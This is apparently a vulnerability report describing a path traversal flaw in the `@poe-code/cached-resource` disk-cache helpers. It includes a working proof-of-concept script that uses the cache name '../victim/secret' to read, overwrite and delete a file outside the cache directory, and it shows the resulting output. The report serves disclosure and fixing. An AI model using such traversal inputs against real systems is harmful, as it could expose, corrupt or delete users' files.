# `@poe-code/cached-resource` cache names escape the configured cache directory

## Summary

The exported disk-cache functions in `@poe-code/cached-resource` accept `cacheName: string` as a base filename, then directly join `${cacheName}.json` beneath `cacheDir` without validating containment. Supplying a traversal name such as `../victim/secret` allows `loadFromDisk()`, `persist()`, and `removeFromDisk()` to read, overwrite, and delete JSON files outside the configured cache directory.

## Reproduction

From the repository root, create a disposable cache directory and sibling victim file, then invoke the exported helpers:

```sh
repo=$PWD
probe=$(mktemp -d)
cache="$probe/cache"
victim="$probe/victim"
mkdir -p "$cache" "$victim"

cat > "$victim/secret.json" <<'EOF'
{"data":{"secret":"outside-cache"},"timestamp":4102444800000}
EOF

cat > "$probe/repro.mts" <<EOF
import { promises as fs } from "node:fs";
import { loadFromDisk, persist, removeFromDisk } from "file://$PWD/packages/cached-resource/src/disk-cache.ts";

const deps = { fs: {
  readFile: (path: string, encoding: BufferEncoding) => fs.readFile(path, encoding),
  writeFile: (path: string, data: string) => fs.writeFile(path, data),
  mkdir: (path: string, options?: { recursive?: boolean }) => fs.mkdir(path, options).then(() => undefined),
  unlink: (path: string) => fs.unlink(path)
}};
const config = {
  cacheDir: "$cache",
  cacheName: "../victim/secret",
  staleTtl: Number.MAX_SAFE_INTEGER
};

console.log("read=" + JSON.stringify(await loadFromDisk(config, deps)));
await persist({ overwritten: true }, config, deps);
console.log("written=" + await fs.readFile("$victim/secret.json", "utf8"));
await removeFromDisk(config, deps);
console.log("existsAfterRemove=" + String(await fs.stat("$victim/secret.json").then(() => true, () => false)));
EOF

"$repo/node_modules/.bin/tsx" "$probe/repro.mts"

nl -ba packages/cached-resource/README.md | sed -n '101,109p;154,162p'
nl -ba packages/cached-resource/src/types.ts | sed -n '12,19p'
nl -ba packages/cached-resource/src/disk-cache.ts | sed -n '21,66p'
```

## Observed Behavior

All three exported operations affect the sibling victim path rather than remaining under `cacheDir`:

```text
read={"data":{"secret":"outside-cache"},"timestamp":4102444800000}
written={"data":{"overwritten":true},"timestamp":...}
existsAfterRemove=false
```

`cacheName: "../victim/secret"` normalizes `path.join(cacheDir, `${cacheName}.json`)` to the sibling `victim/secret.json` path. No helper validates that `cacheName` is a basename or that the resolved path remains within `cacheDir`.

## Expected Behavior

An API describing `cacheName` as the base name for a cache file should reject path separators/traversal segments, or enforce that all disk-cache operations resolve within `cacheDir`. It must not access files outside the configured cache directory.

## Impact

Any consumer that derives cache names from remote resource identifiers, user input, or plugin configuration can be induced to disclose, overwrite, or delete JSON files outside its cache storage. The delete path is especially destructive because it silently suppresses errors while operating on an escaped target.
